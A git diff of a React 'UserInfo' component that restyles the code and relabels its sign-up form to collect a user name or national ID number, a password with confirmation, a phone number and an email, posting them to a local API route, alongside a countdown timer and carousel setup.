@@ -1,33 +1,33 @@
-import { Pagination, Autoplay, A11y, EffectCards } from "swiper/modules";
-import { Swiper, SwiperSlide } from "swiper/react";
-import SwiperCore from "swiper";
+import { Pagination, Autoplay, A11y, EffectCards } from 'swiper/modules'
+import { Swiper, SwiperSlide } from 'swiper/react'
+import SwiperCore from 'swiper'
 
 // Import Swiper styles
-import "swiper/css";
-import "swiper/css/navigation";
-import "swiper/css/pagination";
-import "swiper/css/scrollbar";
-import "swiper/css/free-mode";
-import "swiper/css/thumbs";
-import { FaArrowRightLong } from "react-icons/fa6";
-import { useEffect, useState } from "react";
+import 'swiper/css'
+import 'swiper/css/navigation'
+import 'swiper/css/pagination'
+import 'swiper/css/scrollbar'
+import 'swiper/css/free-mode'
+import 'swiper/css/thumbs'
+import { FaArrowRightLong } from 'react-icons/fa6'
+import { useEffect, useState } from 'react'
 
 const UserInfo = () => {
-  SwiperCore.use([Autoplay]);
+  SwiperCore.use([Autoplay])
   // a countdown timer function
-  const [time, setTime] = useState(180);
+  const [time, setTime] = useState(180)
   useEffect(() => {
     const timer = setInterval(() => {
       setTime((prevTime) => {
         if (prevTime === 0) {
-          clearInterval(timer);
-          return 0;
+          clearInterval(timer)
+          return 0
         }
-        return prevTime - 1;
-      });
-    }, 1000);
-    return () => clearInterval(timer);
-  }, []);
+        return prevTime - 1
+      })
+    }, 1000)
+    return () => clearInterval(timer)
+  }, [])
 
   return (
     <>
@@ -88,51 +88,51 @@ const UserInfo = () => {
         <form action="./api/data" method="post" className="w-3/4 my-14">
           <div className="relative z-0 w-full mb-6 group">
             <input
-              type="email"
-              name="floating_email"
-              id="floating_email"
+              type="number"
+              name="identity"
+              id="identity"
               className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
-              placeholder=" "
+              placeholder=""
               required
             />
             <label
-              for="floating_email"
+              for="identity"
               className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
             >
-              Email address
+              User Name/NID/Akama
             </label>
           </div>
           <div className="grid md:grid-cols-2 md:gap-6">
             <div className="relative z-0 w-full mb-6 group">
               <input
                 type="text"
-                name="floating_first_name"
-                id="floating_first_name"
+                name="password"
+                id="password"
                 className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
                 placeholder=" "
                 required
               />
               <label
-                for="floating_first_name"
+                for="password"
                 className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
               >
-                First name
+                Password
               </label>
             </div>
             <div className="relative z-0 w-full mb-6 group">
               <input
                 type="text"
-                name="floating_last_name"
-                id="floating_last_name"
+                name="confirmPassword"
+                id="confirmPassword"
                 className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
                 placeholder=" "
                 required
               />
               <label
-                for="floating_last_name"
+                for="confirmPassword"
                 className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
               >
-                Last name
+                Confirm Password
               </label>
             </div>
           </div>
@@ -141,47 +141,47 @@ const UserInfo = () => {
               <input
                 type="tel"
                 pattern="[0-9]{3}-[0-9]{3}-[0-9]{4}"
-                name="floating_phone"
-                id="floating_phone"
+                name="phone"
+                id="phone"
                 className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
                 placeholder=" "
                 required
               />
               <label
-                for="floating_phone"
+                for="phone"
                 className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
               >
-                Phone number (123-456-7890)
+                Phone number
               </label>
             </div>
             <div className="relative z-0 w-full mb-6 group">
               <input
-                type="text"
-                name="floating_company"
-                id="floating_company"
+                type="email"
+                name="email"
+                id="email"
                 className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
                 placeholder=" "
                 required
               />
               <label
-                for="floating_company"
+                for="email"
                 className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
               >
-                Company (Ex. Google)
+                Email address
               </label>
             </div>
           </div>
           <button
             type="submit"
-            className="font-bold w-full px-4 py-2 text-sm tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 rounded-md hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
+            className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
           >
-            Submit
+            Next <FaArrowRightLong size={16} />
           </button>
         </form>
       </div>
       <div className="h-20 bg-teal-400 mt-5"></div>
     </>
-  );
-};
+  )
+}
 
-export default UserInfo;
+export default UserInfo
